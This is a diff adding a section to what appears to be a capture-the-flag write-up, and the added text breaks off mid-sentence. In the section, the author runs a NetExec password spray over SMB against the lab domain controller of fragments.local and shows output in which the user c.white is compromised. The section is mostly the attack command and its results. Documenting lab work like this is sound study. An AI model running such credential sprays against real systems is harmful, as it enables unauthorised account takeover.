@@ -328,5 +328,21 @@ So its not given me a user so ill spray it against the userlist
 # Password spray leads to user compromise
 
 ```python
-
+nxc smb dc01.fragments.local -u users.txt -p 'ESwXHXweG!' --continue-on-success --smb-timeout 5  
+SMB         10.0.29.162     445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:fragments.local) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.0.29.162     445    DC01             [-] fragments.local\Administrator:ESwXHXweG! STATUS_LOGON_FAILURE 
+SMB         10.0.29.162     445    DC01             [-] fragments.local\Guest:ESwXHXweG! STATUS_LOGON_FAILURE 
+SMB         10.0.29.162     445    DC01             [-] fragments.local\krbtgt:ESwXHXweG! STATUS_LOGON_FAILURE 
+SMB         10.0.29.162     445    DC01             [-] fragments.local\DC01$:ESwXHXweG! STATUS_LOGON_FAILURE 
+SMB         10.0.29.162     445    DC01             [-] fragments.local\FRG0310$:ESwXHXweG! STATUS_LOGON_FAILURE 
+SMB         10.0.29.162     445    DC01             [-] fragments.local\PROD$:ESwXHXweG! STATUS_LOGON_FAILURE 
+SMB         10.0.29.162     445    DC01             [-] fragments.local\o.rodrigo:ESwXHXweG! STATUS_LOGON_FAILURE 
+SMB         10.0.29.162     445    DC01             [-] fragments.local\j.woods:ESwXHXweG! STATUS_LOGON_FAILURE 
+SMB         10.0.29.162     445    DC01             [-] fragments.local\d.goggins:ESwXHXweG! STATUS_LOGON_FAILURE 
+SMB         10.0.29.162     445    DC01             [+] fragments.local\c.white:ESwXHXweG! 
+SMB         10.0.29.162     445    DC01             [-] fragments.local\sharedadmin:ESwXHXweG! STATUS_ACCOUNT_RESTRICTION
 ```
+
+So ive now compromised a user `c.white`
+
+There is also a ``
